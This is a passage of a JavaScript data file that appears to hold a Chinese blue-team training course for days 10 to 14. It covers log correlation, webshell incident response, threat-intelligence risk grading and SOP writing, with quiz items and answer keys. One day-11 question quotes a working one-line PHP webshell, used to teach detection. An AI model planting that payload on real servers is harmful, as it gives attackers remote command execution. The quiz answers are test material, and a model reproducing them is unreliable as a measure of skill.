      {type:'boolean',question:'策略优化就是不断地加白名单，直到误报清零。',options:['正确','错误'],correctIndex:1,explanation:'错误！策略优化=平衡安全性和可用性。盲目加白名单消除所有误报可能导致真实攻击被放行。目标是可控的误报率+核心攻击面全覆盖。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-10', day: 10,
    title: '多源日志关联分析',
    subtitle: '实战进阶周（初级→中级岗）',
    objectives: ['掌握系统日志+Web日志+流量包三源关联', '还原攻击者完整入侵时间线', '输出无断档的攻击事件时间线报告'],
    keyPoints: ['Wireshark异常流量分析', 'Windows安全取证', '三源日志关联', '攻击时间线还原', 'PCAP分析'],
    content: `# Day 10：多源日志关联分析

> **阶段**：实战进阶周（初级→中级岗）

## 📚 核心学习内容
- 视频：Wireshark异常流量 + Windows安全取证
- 新增：结合系统日志、Web日志、流量包三源关联

## 🔧 实操任务
- 分析给定的PCAP包+多源日志
- 还原攻击者完整入侵时间线

## ✅ 验收标准
- 输出《攻击事件时间线还原报告》
- 逻辑无断档`,
    quiz: [
      // 三源关联
      {question:'三源日志关联分析的"三源"不包括以下哪一项？',options:['系统日志','Web服务器日志','应用错误日志','网络流量包(PCAP)'],correctIndex:2,explanation:'三源=系统日志(Windows/Linux)+Web服务器日志+网络流量包(PCAP)。应用错误日志属于辅助参考源。'},
      {question:'为什么单看Web日志不足以还原完整攻击过程？',options:['Web日志数据太多','Web日志只记录HTTP请求，看不到系统级后门安装、进程运行、内网通信等行为','Web日志太难分析','Web日志是加密的'],correctIndex:1,explanation:'Web日志只能看到HTTP层面的交互（请求URL/状态码/User-Agent），看不到攻击者上传后门后在系统层的操作（进程/注册表/网络连接）。需要三源互补。'},
      {type:'fill',question:'三源日志关联分析中，网络流量包(PCAP)的核心优势是可以还原___层完整通信内容，包括Payload。',correctAnswer:'传输/网络',explanation:'PCAP=完整数据包捕获，记录了TCP/IP+应用层全部数据，是攻击证据链中最具分量的证据来源。'},
      {type:'boolean',question:'攻击时间线还原要求每个环节都要有对应的日志/流量证据支撑，逻辑不能有断档。',options:['正确','错误'],correctIndex:0,explanation:'正确。攻击时间线还原的核心要求就是每个攻击步骤都有可靠证据支撑，不能有逻辑跳跃或推断。'},
      // 攻击时间线还原
      {question:'攻击时间线还原中，"断档"意味着什么？',options:['日志记录完整','两个攻击步骤之间缺乏证据支撑，存在逻辑跳跃','攻击者暂停了攻击','服务器断网'],correctIndex:1,explanation:'断档=证据不连续。如Web日志显示上传了文件，但系统日志没有对应的进程创建记录，说明中间可能有关键日志缺失或被清除。'},
      {type:'fill',question:'输出攻击事件时间线报告时，每个事件应标注四个要素：时间戳、___、事件描述和证据来源。',correctAnswer:'攻击阶段',explanation:'时间线四要素=时间戳+攻击阶段(Kill Chain阶段)+事件描述+证据来源（哪个日志/哪个设备），确保每个步骤可追溯。'},
      {type:'multiple',question:'以下哪些信息可以从PCAP流量包中提取？（多选）',options:['攻击者使用的Payload','C2通信的心跳包','文件传输的内容','SSL/TLS加密前的明文数据(如有密钥)'],correctIndices:[0,1,2,3],explanation:'PCAP=完整流量镜像，可以还原所有网络层+应用层通信。如果有SSL密钥，还可解密HTTPS流量查看明文。'},
      // Wireshark异常流量分析
      {question:'分析PCAP发现内网主机在非工作时间向境外IP持续发送DNS A记录查询，查询域名均为随机字符串（如aB3x9.dGAx3.com），这很可能是什么？',options:['正常软件更新','DNS隧道——利用DNS查询隐蔽传输数据','NTP时间同步','软件激活'],correctIndex:1,explanation:'随机子域名+境外IP+周期性查询=DNS隧道典型特征。攻击者将数据编码在DNS查询的子域名中，绕过防火墙限制将数据外传。'},
      {type:'fill',question:'Wireshark中分析ICMP流量时，发现大量ICMP Echo Request的Data字段包含非随机内容（如明文文本），这可能是___隧道。',correctAnswer:'ICMP',explanation:'ICMP隧道=利用ping包的Data字段传输数据，通过ICMP协议绕过只关注TCP/UDP的防火墙规则。正常ping的数据字段通常为固定模式。'},
      {question:'使用Wireshark分析PCAP时，Statistics → Conversations 功能主要用于什么？',options:['查看会话统计：哪些IP之间通信最多、流量最大','加密数据包','修改数据包内容','重新排列数据包顺序'],correctIndex:1,explanation:'Conversations统计=IP对之间的通信汇总（字节数/包数/持续时间），用于快速发现异常通信对（如内网IP与境外C2的大量通信）。'},
      {type:'boolean',question:'Wireshark的"Follow TCP Stream"功能可以重组TCP流中的完整通信内容，查看客户端与服务器的完整对话。',options:['正确','错误'],correctIndex:0,explanation:'正确。Follow TCP Stream将分散的TCP段按序列号重组，展示HTTP请求-响应的完整交互，是分析攻击对话的核心功能。'},
      // Windows安全取证
      {question:'Windows安全事件日志中，事件ID 4688记录了什么？',options:['登录成功','新进程创建','权限提升','文件删除'],correctIndex:1,explanation:'4688=新进程创建（需启用命令行审计策略才能记录完整命令行参数），是发现恶意进程执行的核心事件。'},
      {type:'fill',question:'Windows取证中，___键是恶意软件最常使用的持久化位置之一，系统启动时会自动运行其中的程序。',correctAnswer:'Run注册表/Run',explanation:'HKCU\Software\Microsoft\Windows\CurrentVersion\Run 和 HKLM下对应路径是Windows自启动最常见位置。恶意软件常在此添加入口保持持久化。'},
      {question:'在关联分析中，Web日志显示攻击者上传了一个文件到/upload/shell.php，系统日志应查找什么来确认后门是否被成功激活？',options:['事件ID 4624','事件ID 4688(新进程创建)，查找w3wp.exe或php-cgi.exe的子进程','事件ID 4672','事件ID 4634'],correctIndex:1,explanation:'Webshell被访问时Web服务器会fork进程执行PHP/Python等脚本，产生4688事件记录子进程创建，是后门激活的关键证据。'},
      {type:'multiple',question:'以下哪些Windows事件ID在应急取证中最为关键？（多选）',options:['4624(登录成功)','4625(登录失败)','4672(特权分配)','4688(进程创建)','7045(新服务安装)'],correctIndices:[0,1,2,3,4],explanation:'以上均为取证核心事件ID。4624/4625=账户行为，4672=权限提升，4688=进程创建，7045=服务安装（后门常伪装为Windows服务）。'},
      // 实战
      {question:'给定场景：Web日志显示10:00攻击者上传shell.php，系统日志显示10:01出现cmd.exe进程（父进程w3wp.exe），10:05 cmd.exe连接了国外IP的443端口。这里三源各自提供了什么证据？',options:['全是重复证据','Web日志=入口证据，系统日志=后门激活证据，PCAP=C2通信证据','只有Web日志有-用','不需要PCAP'],correctIndex:1,explanation:'三源互补=Web日志提供入口信息（谁、什么时候、从哪里进来了），系统日志提供行为信息（做了什么），PCAP提供外联信息（将数据传到了哪里）。'},
      {type:'fill',question:'Linux系统中，___文件记录了所有用户执行的命令历史（含时间戳），是溯源攻击者操作行为的重要证据。',correctAnswer:'.bash_history',explanation:'~/.bash_history记录用户shell命令历史。但注意攻击者可能通过history -c清除，或使用无历史记录的shell（sh -c）。'},
      {question:'PCAP分析中发现异常：内网IP 192.168.1.50在短时间内连接了50+个不同的内网IP的445端口，这最可能是什么行为？',options:['正常AD同步','内网端口扫描——攻击者在探测其他主机的SMB服务','Windows自动更新','软件许可检查'],correctIndex:1,explanation:'445端口=SMB服务（Windows文件共享），短时间内扫描大量IP的445端口=攻击者在探测内网其他Windows主机，准备横向移动。'},
      {type:'boolean',question:'在应急取证中，优先收集易失性证据（内存、网络连接、进程信息），再收集持久性证据（硬盘、日志文件）。',options:['正确','错误'],correctIndex:0,explanation:'正确。取证顺序=从易失到持久。内存和网络连接信息一旦关机就会丢失，应优先获取，然后再做硬盘镜像和日志备份。'},
      {question:'在还原攻击时间线时，发现不同日志源的时间戳对不上（相差几分钟），最可能的原因是什么？',options:['日志被篡改','不同设备的系统时间未做NTP同步','攻击者修改了时间','日志记录错误'],correctIndex:1,explanation:'时间戳不一致最常见原因=各设备未统一NTP时间同步。这也是护网战前加固的重要检查项——确保所有设备日志时间精确一致。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-11', day: 11,
    title: '应急响应全流程（Webshell）',
    subtitle: '实战进阶周（初级→中级岗）',
    objectives: ['输出Webshell应急处置SOP', '能独立排查可疑后门', '掌握应急排查5项核心动作'],
    keyPoints: ['PDCERF实战', 'Webshell入侵排查', '应急5项核心动作(进程/服务/启动项/计划任务/日志)', '遏制→清除→加固→报告'],
    content: `# Day 11：应急响应全流程（Webshell）

> **阶段**：实战进阶周（初级→中级岗）

## 📚 核心学习内容
- 视频：PDCERF实战 + Webshell入侵排查
- 新增：Windows/Linux应急排查5项核心动作（进程/服务/启动项/计划任务/日志）

## 🔧 实操任务
- 在靶机模拟Webshell上传
- 完成遏制→清除→加固→报告全流程

## ✅ 验收标准
- 输出《Webshell应急处置SOP》
- 能独立排查可疑后门`,
    quiz: [
      // 应急排查核心动作
      {type:'multiple',question:'以下哪些属于应急排查的5项核心动作？（多选）',options:['进程排查','服务检查','启动项检查','计划任务检查','日志分析'],correctIndices:[0,1,2,3,4],explanation:'五项全部是核心动作：进程→服务→启动项→计划任务→日志，覆盖后门常见隐藏位置。'},
      {question:'发现Webshell后的正确处置顺序是？',options:['直接删除文件→重启服务器','备份证据→遏制→清除→加固→报告','格式化服务器→恢复备份','仅记录不处理，等上级指示'],correctIndex:1,explanation:'标准流程：先固定/备份证据，再依序遏制→清除→加固→复盘报告，不能直接删除破坏证据链。'},
      {type:'fill',question:'应急处置中，备份证据最常用的方法是保留Webshell文件副本、导出相关日志和___镜像。',correctAnswer:'内存',explanation:'内存镜像(Memory Dump)=捕获当前系统状态（进程/网络连接/注册表/命令历史），是易失性证据最重要的获取方式。'},
      {question:'Webshell最常伪装的文件类型是什么？',options:['.jpg图片','.php/.jsp/.asp脚本文件','.txt文本文件','.exe可执行文件'],correctIndex:1,explanation:'Webshell通常是服务器端脚本文件(.php/.jsp/.asp/.aspx)，攻击者将其伪装为正常文件名（如config.php、logo.jsp）混入Web目录。'},
      // 进程排查
      {question:'Windows中使用什么命令可以查看进程的父进程ID（PPID），从而追踪进程创建链？',options:['tasklist','wmic process get name,processid,parentprocessid','netstat','dir'],correctIndex:1,explanation:'wmic process get可显示name(进程名),ProcessId(PID),ParentProcessId(父进程PID)。发现w3wp.exe子进程是cmd.exe即为Webshell典型行为。'},
      {type:'fill',question:'Linux系统中，___命令可以以树状结构显示所有进程及其父子关系，快速发现异常子进程。',correctAnswer:'pstree',explanation:'pstree显示进程树，如httpd──sh──perl──ncat说明Web服务fork了shell再启动了nc外联，高度可疑。'},
      {type:'boolean',question:'排查Webshell时只需要检查Web目录下的最近修改文件即可。',options:['正确','错误'],correctIndex:1,explanation:'错误！还需检查：①文件时间可能被篡改；②Webshell可能藏在更深目录/隐藏目录/正常目录；③内存中已释放的Webshell文件系统中不可见。'},
      // 服务/启动项排查
      {question:'Windows查看所有已安装服务的命令是什么？',options:['tasklist','sc query','netstat -ano','dir /s'],correctIndex:1,explanation:'sc query=查看Windows服务列表。sc query state=all显示所有状态。后门常注册为隐蔽的Windows服务（如"Windows Update Helper"）。'},
      {type:'fill',question:'Linux中查看所有计划任务，应使用___命令。',correctAnswer:'crontab -l',explanation:'crontab -l查看当前用户计划任务，crontab -u 用户名 -l查看指定用户。攻击者常用计划任务实现持久化（如每分钟从C2下载并执行脚本）。'},
      {type:'multiple',question:'以下哪些位置是Webshell后门常用的持久化隐藏点？（多选）',options:['注册表Run键','系统计划任务(crontab/计划任务)','伪装为系统服务','/tmp临时目录'],correctIndices:[0,1,2,3],explanation:'以上全是。注册表自启动、计划任务定时执行、伪装服务自动运行、/tmp下隐藏后门程序，攻击者多管齐下确保持久化。'},
      // 遏制→清除→加固→报告
      {question:'遏制阶段最关键的动作是什么？',options:['清除Webshell','防止攻击范围扩大：隔离主机、禁用账户、阻断C2通信','立即写报告','通知所有用户'],correctIndex:1,explanation:'遏制(Contain)=止血。核心是防止事态升级：隔离受影响主机(断网/隔离VLAN)、禁用被攻破账户、在防火墙阻断已知C2 IP。'},
      {type:'fill',question:'清除阶段完成后必须进行___，即修复导致攻击成功的漏洞，防止攻击者再次利用同样的漏洞进入系统。',correctAnswer:'加固',explanation:'清除≠结束。不修复根因漏洞（如上传未过滤、存在未修复CVE、弱口令），攻击者会再次用同样方式入侵。加固=堵住入口。'},
      {question:'清除Webshell时，以下哪种做法是正确的？',options:['只删除Webshell文件','删除Webshell文件+排查被修改的文件+检查是否有其他后门+分析入侵根因','格式化整台服务器','只封禁攻击IP'],correctIndex:1,explanation:'单一删除不够：攻击者可能上传了多个Webshell、修改了系统文件、留了其他后门。需全面排查+根因分析+加固修复。'},
      {type:'boolean',question:'应急响应报告中只需要写明处置了什么，不需要记录为什么没有更早发现、未来如何改进。',options:['正确','错误'],correctIndex:1,explanation:'错误！完整的应急报告=事件概述+处置过程+根因分析+不足反思+改进措施。反思和改进是报告最有价值的部分。'},
      // 实战
      {question:'蓝队在应急排查中，发现Web服务器上有一个名为"404.php"的文件，内容是一句话木马：<?php @eval($_POST["cmd"])?>。但访问日志中没有直接访问404.php的记录。攻击者可能通过什么方式触发？',options:['攻击者通过其他已控制的文件的include/require调用','这个文件没有被触发','需要密码才能访问','只能通过GET访问'],correctIndex:0,explanation:'一句话木马可通过其他文件的include/require间接调用，或修改.htaccess将404错误页指向404.php实现所有404请求都触发后门。'},
      {type:'fill',question:'应急排查时发现某文件的时间戳异常（修改时间早于创建时间），这通常意味着文件使用了___技术修改了时间戳。',correctAnswer:'timestomp',explanation:'timestomp=修改文件时间戳（MACE值）以逃避基于时间的检测。攻击者将Webshell文件时间伪装为与同目录合法文件一致的时间。'},
      {question:'应急处理Webshell事件后，蓝队发现同一Web服务器还有另一个藏得更深的Webshell未被发现。这说明什么？',options:['黑客水平很高','清除阶段的排查不够全面，遗漏了其他后门文件','操作系统有漏洞','WAF设置不对'],correctIndex:1,explanation:'Webshell清查不彻底=常见问题。排查应包含：文件内容特征(grep)、异常文件时间、异常文件权限、Web日志关联分析、内存中的无文件Webshell。'},
      {type:'multiple',question:'完成Webshell应急后，以下哪些加固措施是必要的？（多选）',options:['配置文件上传白名单（仅允许图片格式）','修复导致上传的文件解析漏洞','审计Web目录权限（去掉写入权限）','部署文件完整性监控（FIM）'],correctIndices:[0,1,2,3],explanation:'以上均为必要加固。上传白名单+漏洞修复=堵入口，权限最小化=限制影响，FIM=实时检测文件变更。多管齐下防止再次被上传后门。'},
      {type:'boolean',question:'只要删除了Webshell文件，这台Web服务器就安全了。',options:['正确','错误'],correctIndex:1,explanation:'错误！Webshell只是攻击的最后一步（工具投递），攻击者可能还留下了其他后门、持久化机制或已窃取了数据库凭证。'},
      {question:'蓝队排查发现某Webshell连接时使用的User-Agent为"Python-urllib/3.10"，这说明了什么？',options:['攻击者使用了Python脚本管理与Webshell的通信','正常的浏览器访问','搜索引擎爬虫','系统自动更新'],correctIndex:0,explanation:'UA为Python-urllib=攻击者使用Python脚本（而非浏览器）管理Webshell，说明这是工具化、自动化的后门操作，攻击者较为专业。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-12', day: 12,
    title: '威胁情报联动与风险定级',
    subtitle: '实战进阶周（初级→中级岗）',
    objectives: ['输出攻击风险分级研判标准', '定级理由充分', '掌握VirusTotal与微步批量IOC查询'],
    keyPoints: ['微步情报实战', '隐蔽攻击识别', 'VirusTotal批量查询', 'IOC黑名单', '攻击风险分级(高/中/低)'],
    content: `# Day 12：威胁情报联动与风险定级

> **阶段**：实战进阶周（初级→中级岗）

## 📚 核心学习内容
- 视频：微步情报实战 + 隐蔽攻击识别
- 新增：VirusTotal与微步批量IOC查询技巧
- 文档：攻击分级标准

## 🔧 实操任务
- 批量导入10个IOC至黑名单
- 对5起历史告警做风险定级（高/中/低）

## ✅ 验收标准
- 输出《攻击风险分级研判标准》
- 定级理由充分`,
    quiz: [
      // 威胁情报与IOC
      {question:'IOC（Indicators of Compromise，威胁指标）不包括以下哪种类型？',options:['恶意IP地址','恶意域名','攻击者姓名','文件MD5哈希'],correctIndex:2,explanation:'IOC是可机读的技术检测指标（IP/域名/URL/hash/注册表项），攻击者姓名属于情报上下文但不作为可机读IOC。'},
      {type:'fill',question:'VirusTotal是一个可同时调用___个以上杀毒引擎交叉检测文件的在线平台。',correctAnswer:'70',explanation:'VirusTotal整合了70+杀毒引擎，可以交叉验证可疑文件是否为恶意样本。'},
      {type:'fill',question:'IOC的三个英文单词全拼是：Indicators of ___。',correctAnswer:'Compromise',explanation:'IOC=Indicators of Compromise（失陷指标），是已确认与安全事件相关的可检测特征集合。'},
      {question:'以下哪个IOC类型具有最长的有效检测周期（攻击者最难改变）？',options:['IP地址','域名','文件哈希(MD5/SHA256)','URL路径'],correctIndex:2,explanation:'文件哈希稳定度最高——改一个字节哈希全变但重新编译成本高。IP地址攻击者可轻易更换（VPN/代理），域名可重新注册。'},
      {type:'boolean',question:'微步在线和VirusTotal的作用完全一样，可以互相替代。',options:['正确','错误'],correctIndex:1,explanation:'错误！微步聚焦中国威胁情报生态（含护网实战数据），VirusTotal是国际多引擎交叉检测平台。两者互补，不是替代关系。'},
      // 风险定级
      {question:'攻击风险定级"高"的典型场景是什么？',options:['端口扫描','核心业务系统被成功攻击且发现异常外联','单次目录探测','正常运维变更'],correctIndex:1,explanation:'高(P1)=确认攻击成功+核心资产受影响。如果是数据正在被窃取则升级为P0紧急级别。'},
      {type:'multiple',question:'攻击风险分级（高/中/低）应综合哪些因素判断？（多选）',options:['攻击是否成功','受影响的资产重要程度','攻击的规模和频率','攻击来源的威胁情报标签'],correctIndices:[0,1,2,3],explanation:'以上四项均为定级要素。风险=成功与否×资产价值×攻击规模×情报威胁度。'},
      {question:'以下哪类告警应定级为"低"风险？',options:['核心数据库被SQL注入成功','一般Web服务器被端口扫描探测','域控制器被成功登录','发现大量数据外传'],correctIndex:1,explanation:'端口扫描属于侦察阶段，未成功入侵，风险等级低(P3)。但需记录并关注是否后续升级为实际攻击。'},
      {type:'boolean',question:'同一外部IP同时触发多条不同类型告警（扫描+SQL注入+文件上传尝试），即使每次都没有成功，也应该提升整体风险评估。',options:['正确','错误'],correctIndex:0,explanation:'正确。多条告警关联=攻击意图升级信号。综合评估比单条判断更能发现复合攻击。'},
      // 批量IOC与实战
      {question:'护网期间收到100个可疑IP，最有效的处理方式是什么？',options:['一个一个手动查','编写脚本调用微步API批量查询','全部封禁','发给同事帮忙查'],correctIndex:1,explanation:'批量API查询=效率最优。微步/VirusTotal均提供API接口，可编写Python脚本批量提交IOC查询。'},
      {type:'fill',question:'在SIEM中，将已确认的恶意IOC批量添加到___中，可自动对命中这些IOC的流量产生告警或阻断。',correctAnswer:'黑名单',explanation:'黑名单/自定义规则=将IOC情报转化为可执行的安全策略，实现"情报驱动"的自动化检测和阻断。'},
      {type:'boolean',question:'将VirusTotal标记为恶意的IP加入黑名单后，该IP就永远不会再产生威胁。',options:['正确','错误'],correctIndex:1,explanation:'错误！攻击者可更换IP/VPN/代理。黑名单只是基于已知情报的过滤层，需要结合行为检测形成多层防御。'},
      // 隐蔽攻击识别
      {question:'以下哪个行为最具"隐蔽攻击"特征？',options:['大流量端口扫描','定时DNS查询，每次查询域名不同但长度固定','大量SQL注入尝试','FTP暴力破解'],correctIndex:1,explanation:'定时DNS查询+域名变化=远程心跳包/数据外传的隐蔽信号。传统手段难以发现这种低频、非标准端口的通信。'},
      {type:'fill',question:'攻击者使用___技术将数据隐藏在DNS查询中传输，绕过了只监控HTTP/HTTPS流量的安全设备。',correctAnswer:'DNS隧道',explanation:'DNS隧道=将数据编码在DNS查询/响应中传输（如TXT记录的base64内容），利用DNS协议几乎不被封锁的特点隐蔽通信。'},
      {question:'内网主机每隔30分钟向同一境外IP的53端口发送DNS请求，查询域名均为固定长度随机字符串。这说明什么？',options:['系统自动更新','C2心跳——可能已被植入后门','正常DNS解析','网络环路'],correctIndex:1,explanation:'固定间隔+固定长度随机域名+单一境外目标=高度可疑的C2心跳通信。后门通过DNS定时查询"打卡报到"并接收C2指令。'},
      // 综合
      {type:'multiple',question:'以下哪些平台可用于威胁情报查询？（多选）',options:['微步在线','VirusTotal','AlienVault OTX','安恒威胁情报中心'],correctIndices:[0,1,2,3],explanation:'以上均为主流威胁情报平台。微步适合国内护网场景，VT适合国际多引擎交叉验证，OTX是开源情报社区。'},
      {question:'VirusTotal查询可疑文件时3/72引擎标记为恶意，其余69个未报警，该如何判断？',options:['文件一定安全','可能是新样本或定制化攻击，需结合沙箱动态分析','VT不可信','只有全部报警才可信'],correctIndex:1,explanation:'低检出率≠安全。可能是新型恶意软件(0day)或高度定制化的定向攻击样本。需静态+动态+上下文综合判断。'},
      {type:'fill',question:'威胁情报中的TTPs是指攻击者的___（Tactics）、___（Techniques）和步骤（Procedures）。',correctAnswer:'战术/技术',explanation:'TTPs=Tactics(战术目标)+Techniques(技术方法)+Procedures(实施步骤)。TTPs比IOC更难改变，是高级溯源的核心依据。'},
      {type:'boolean',question:'使用免费版VirusTotal查询的IOC会被公开，不适合查询企业内部敏感资产的相关信息。',options:['正确','错误'],correctIndex:0,explanation:'正确！VirusTotal免费版提交的文件/IOC会被社区共享。查询企业内部信息应使用付费私有API或本地沙箱。'},
      {question:'以下哪项最适合描述TTPs与IOC的区别？',options:['没有区别','IOC是"可变的指纹"，TTPs是"难以改变的行为习惯"','IOC比TTPs更重要','TTPs只适用于APT'],correctIndex:1,explanation:'IOC=指纹（换个IP/域名就变了），TTPs=行为习惯（长期形成的工作方式很难改变）。基于TTPs的检测更有前瞻性。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-13', day: 13,
    title: '护网日报与标准化SOP撰写',
    subtitle: '实战进阶周（初级→中级岗）',
    objectives: ['日报结构完整（攻击趋势/TOP事件/处置情况）', 'SOP具备可操作性（含命令/截图占位）'],
    keyPoints: ['复盘报告撰写', 'SOP落地', '攻击趋势', 'TOP事件', '处置情况', '暴力破解SOP', 'SQL注入SOP'],
    content: `# Day 13：护网日报与标准化SOP撰写

> **阶段**：实战进阶周（初级→中级岗）

## 📚 核心学习内容
- 视频：复盘报告撰写 + SOP落地技巧
- 新增：日报必须包含"攻击趋势、TOP事件、处置情况"三要素

## 🔧 实操任务
- 撰写1份完整护网日报
- 暴力破解、SQL注入两份处置SOP

## ✅ 验收标准
- 日报结构完整
- SOP具备可操作性（含命令/截图占位）`,
    quiz: [
      // 日报结构
      {type:'multiple',question:'一份标准护网日报必须包含哪些核心要素？（多选）',options:['攻击趋势','TOP事件','处置情况','员工考勤'],correctIndices:[0,1,2],explanation:'三方要素缺一不可：攻击趋势概览→TOP事件详情→处置结果汇总。员工考勤不属于护网日报核心内容。'},
      {question:'护网日报中"攻击趋势"部分通常包含什么内容？',options:['员工出勤情况','按时间展示告警数量的变化曲线及主要攻击类型分布','食堂菜单','天气预报'],correctIndex:1,explanation:'攻击趋势=当班时间段内告警数量的时间变化+攻击类型分布（如扫描占60%、SQL注入占20%、暴力破解占15%等）+与前一班对比。'},
      {type:'fill',question:'日报中的"TOP事件"应详述本班次中优先-级最高的___个安全事件。',correctAnswer:'3-5/3/5',explanation:'TOP事件=3-5个最重要事件，每个事件包含：时间、来源IP、攻击类型、影响资产、处置结果。让读者快速了解本班次发生了什么大事。'},
      {type:'boolean',question:'护网日报就是要写得越多越好，把所有告警都列出来。',options:['正确','错误'],correctIndex:1,explanation:'错误！日报=提炼精华而非流水账。聚焦趋势+TOP事件+处置结果，让领导/下一班快速抓住重点。详细台账另附。'},
      // SOP撰写
      {type:'boolean',question:'SOP（标准操作程序）中应包含具体命令和截图占位，以确保新人也能按步骤执行。',options:['正确','错误'],correctIndex:0,explanation:'正确。好的SOP需要包含可复现的操作命令和截图示例，降低执行门槛。SOP的目标是"换谁都一样操作"。'},
      {question:'撰写暴力破解处置SOP时，最应该包含的核心内容是什么？',options:['暴力破解的理论原理','一步一步的操作流程：从确认告警→查源IP情报→封禁IP→通知用户→记录台账','暴力破解的历史','公司概况'],correctIndex:1,explanation:'SOP核心=可执行的操作步骤。一步一截图、一步一命令，确保执行者不用思考"下一步该干什么"。'},
      {type:'fill',question:'一份合格的SOP必须包含：适用场景、前置条件、___步骤、预期结果、异常处理。',correctAnswer:'操作/执行',explanation:'SOP五要素=适用场景+前置条件+操作步骤+预期结果+异常处理。缺少任何一个都无法保证可操作性。'},
      {type:'multiple',question:'以下哪些是护网期间需要标准化的SOP类型？（多选）',options:['暴力破解处置SOP','SQL注入处置SOP','Webshell应急SOP','IP封禁/解封SOP','交接班SOP'],correctIndices:[0,1,2,3,4],explanation:'以上全部需要SOP标准化。所有高频操作都应SOP化，减少个人能力差异带来的处置质量波动。'},
      // 攻击趋势分析
      {question:'护网早班交接到中班时，早班日报显示"攻击趋势上升，SQL注入类告警增加300%"。中班最应该做什么？',options:['忽略，可能是误报','重点加强Web攻击监控，检查WAF规则是否失效，排查新增的SQL注入来源','正常巡逻，无需特别关注','通知甲方换人'],correctIndex:1,explanation:'SQL注入告警暴涨300%=异常信号。可能是新攻击工具/新攻击队上线，或WAF规则失效。需立即加强监控并排查原因。'},
      {type:'fill',question:'日报中攻击IP来源的TOP5统计，可以帮助识别___攻击来源，为调整封禁策略提供依据。',correctAnswer:'高频',explanation:'TOP攻击IP=攻击频率最高的来源。封禁这些IP可大幅降低噪声告警，让分析师聚焦更隐蔽的攻击。'},
      // 复盘报告
      {question:'复盘报告和日报的最主要区别是什么？',options:['没有区别','复盘报告聚焦根因分析和改进措施，日报是值班情况快照','复盘报告更长','日报不需要写'],correctIndex:1,explanation:'日报=值班快照（发生了什么），复盘=深度分析（为什么会发生、如何防止再发生）。复盘是提升组织防御能力的关键环节。'},
      {type:'boolean',question:'SOP写好后就一劳永逸了，不需要更新。',options:['正确','错误'],correctIndex:1,explanation:'错误！SOP需要持续迭代：新的攻击手法出现→更新检测/处置方式，每次事件复盘后→补充漏掉的检查项。SOP是活的文档。'},
      // 实战撰写
      {type:'fill',question:'护网日报的核心三要素可以简记为：趋势、___、处置。',correctAnswer:'TOP事件',explanation:'趋势(全景)+TOP事件(重点)+处置(成果)，三要素让读者3分钟内掌握本班次安全全貌。'},
      {question:'编写SQL注入事件处置SOP时，以下哪个内容最不应该省略？',options:['SQL注入的定义','确认攻击成功与否的判断标准（如数据库错误回显、返回敏感数据）','SQL发展历史','公司组织架构'],correctIndex:1,explanation:'SOP关键是可操作的判断标准——"什么情况下判定攻击成功？什么情况是无效探测？"——这一步判断直接决定后续处置方案的选择。'},
      {type:'multiple',question:'以下哪些是好的SOP应具备的特点？（多选）',options:['步骤清晰（编号+截图）','每个步骤有预期结果','异常分支处理说明','用模板填空方式快速填写'],correctIndices:[0,1,2,3],explanation:'四项均为优秀SOP特征。好的SOP=新人在无指导情况下能独立完成。每步可验证结果+异常有兜底方案。'},
      {question:'为什么护网日报需要记录"处置情况"而不只是"告警情况"？',options:['满足格式要求','处置情况=蓝队的"产出"证明——不只是看到了攻击，还做了什么事','为了凑字数','甲方要求'],correctIndex:1,explanation:'处置情况=蓝队的工作成果量化。封了多少IP、处理了多少事件、阻止了多少攻击——这些数据是蓝队价值的直接体现。'},
      {type:'fill',question:'交接班时最重要的文档是___，确保下一班知道当前攻击态势和待办事项。',correctAnswer:'日报/交班记录',explanation:'交班记录/日报=信息传递的桥梁。口头交接有遗漏风险，书面记录确保关键信息不丢失。'},
      {question:'日报中发现本班次99%的告警都来自同一个已被封禁的IP段，这说明了什么？',options:['攻击很猛烈','防火墙封禁策略可能未生效或配置错误，需立即检查','正常情况','应该把所有IP都封掉'],correctIndex:1,explanation:'已封禁IP段仍在产生告警=封禁策略可能未生效/规则顺序错误/封禁被绕过。需要立即排查策略执行状态。'},
      {type:'boolean',question:'护网期间只需要记录P0/P1级别的事件，P2/P3级别的低风险事件不需要写入日报。',options:['正确','错误'],correctIndex:1,explanation:'错误！日报中的"攻击趋势"需要全量数据支撑，P2/P3虽不够"重磅"但揭示了攻击活动的整体态势和趋势变化。'},
    ],
    resources: [
      {name:'FreeBuf护网指南',url:'https://www.freebuf.com/articles/es/',type:'article'},
      {name:'MITRE ATT&CK框架',url:'https://attack.mitre.org/',type:'article'},
    ],
  },

  {
    id: 'hw-e28-14', day: 14,
    title: '第二阶段验收考核',
    subtitle: '实战进阶周（初级→中级岗）',
    objectives: ['考核达标', '能独立完成中级岗的告警深度研判', '通过误报优化实操', '通过日志溯源笔试', '提交完整事件处置报告'],
    keyPoints: ['误报优化实操', '日志溯源', '事件处置报告', '告警深度研判', '阶段总结'],
    content: `# Day 14：第二阶段验收考核

> **阶段**：实战进阶周（初级→中级岗）

## 📚 考核内容
- 融合考核：误报优化实操 + 日志溯源笔试 + 完整事件处置报告提交

## 🔧 实操任务
- 输出《第二阶段学习总结与提升计划》

## ✅ 验收标准
- 考核达标
- 能独立完成中级岗的告警深度研判`,
    quiz: [
      // 中级岗能力评估
      {question:'中级蓝队岗与初级岗最核心的能力区别是什么？',options:['会用更多工具','能独立完成深度研判和溯源','工作年限更长','能编写Python脚本'],correctIndex:1,explanation:'中级岗核心标志=从"被动执行处置"升级到"独立研判+深度溯源"的能力跃迁。'},
      {type:'fill',question:'第二阶段考核包含三项：误报优化实操、日志溯源笔试和完整___报告提交。',correctAnswer:'事件处置',explanation:'三项考核=误报优化实操+日志溯源笔试+完整事件处置报告。'},
      // 阶段二知识点回顾
